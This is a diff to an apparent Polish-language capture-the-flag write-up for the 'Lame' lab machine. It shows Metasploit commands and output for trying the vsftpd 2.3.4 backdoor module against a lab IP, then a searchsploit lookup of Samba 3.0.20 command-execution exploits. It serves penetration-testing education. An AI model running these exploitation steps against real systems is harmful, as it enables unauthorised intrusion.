@@ -72,9 +72,9 @@ Krótkie wyjaśnienie przełączników:
 
 Jak widzimy na powyższym zrzucie mamy kilka usług: ftp, ssh oraz sambę. SSH raczej możemy odrzucić, rzadko jest to punkt wejścia do maszyny, chyba, że innym sposobem (np. poprzez wykorzystanie dziury w aplikacji webowej) udało się zdobyć poświadczenia do logowania. Zostaje zatem ftp oraz samba. Szybkie wyszukanie w google frazy "vsftpd 2.3.4" prowadzi nas do strony (https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor). Według opisu tej podatności do archiwum vsftp został wprowadzony backdoor, który pozwala na wykonanie dowolnego polecenia na systemie z uprawnieniami usługi vsftpd. Czyli mamy podatność typu RCE (Remote Code Execution). Możemy zatem przejść do próby eksploitacji. 
 
-# Eksploitacja wersja łatwa
+# Eksploitacja vsftpd
 
-W pierwszej wersji wykorzystamy narzędzie metasploit, które zawiera gotowy do wykorzystania eksploit. Uruchamiamy metasploita:
+Do pierwszej próby zdobycia dostępu do maszyny wykorzystamy narzędzie metasploit, które zawiera gotowy do wykorzystania eksploit. Uruchamiamy metasploita:
 
 ```bash
 msfconsole
@@ -97,5 +97,112 @@ Metasploit tip: Enable verbose logging with set VERBOSE true
 msf5 > 
 ```
 
-# Eksploitacja wersja pro - piszemy eksploita w Pythonie
+Możemy przeszukać potężną bazę eksploitów i zobaczyć czy jest dostępny eksploit na tą konkretną wersję vsftpd:
+
+```bash
+msf5 > search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+```
+Ekspolit jest dostępny zatem możemy przejść do próby jego wykorzystania. Robimy to używając polecenia use i podając pełna ścieżkę do nazwy eksploita:
+
+```bash
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+Możemy również wyświetlić informacje o danym eksploicie oraz parametry które musimy ustawić aby zadziałał:
+
+```bash
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > info
+       Name: VSFTPD v2.3.4 Backdoor Command Execution
+     Module: exploit/unix/ftp/vsftpd_234_backdoor
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2011-07-03
+
+Provided by:
+  hdm <x@hdm.io>
+  MC <mc@metasploit.com>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT   21               yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 0 characters
+
+Description:
+  This module exploits a malicious backdoor that was added to the 
+  VSFTPD download archive. This backdoor was introduced into the 
+  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
+  according to the most recent information available. This backdoor 
+  was removed on July 3rd 2011.
+
+References:
+  OSVDB (73573)
+  http://pastebin.com/AetT9sS5
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+```
+Jak widać jedynym potrzebnym parametrem jest parametr RHOSTS, który jest standardowy dla większości (wszystkich?) eksploitów czyli remote host. Tak więc ustawiamy go na adres IP maszyny Lame:
+
+```bash
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+```
+
+Jesteśmy gotowi do eksploitacji:
+
+```bash
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 
+
+[-] 10.10.14.36:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.10.14.36:21).
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+```
+Niestety widzimy informację o tym, że nie została utworzona żadna sesja. Oznacza to, że próba eksploitacji była nieudana. Prawdopodobnie wersja zainstalowana na serwerze nie jest już podatna na ten błąd ponieważ zgodnie z opisem został on dość szybko usunięty. Jeśli pamiętamy nasz pierwszy krok (rekonesans) to pamiętamy, że poza vsftp była jeszcze jedna usługa, która może zawierać jakąś podatność: samba.
+
+# Eksploitacja samba
+
+Do próby eksploitacji możemy również użyć narzędzia metasploit. Tym razem do sprawdzenia czy jest dostępny moduł użyjemy searchsploit, który moim zdaniem daje bardziej przejrzyste wyniki wyszukiwania:
+```bash
+searchsploit samba 3.0.20
+---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                          |  Path
+---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                  | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                        | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                   | linux/remote/7701.txt
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                   | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                           | linux_x86/dos/36741.py
+---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Na powyższym zrzucie widzimy, że mamy kilka możliwości do wyboru, ale najciekawsza wydaje się być opcja "'Username' map script' Command Execution (Metasploit)"
+
 # Podsumowanie
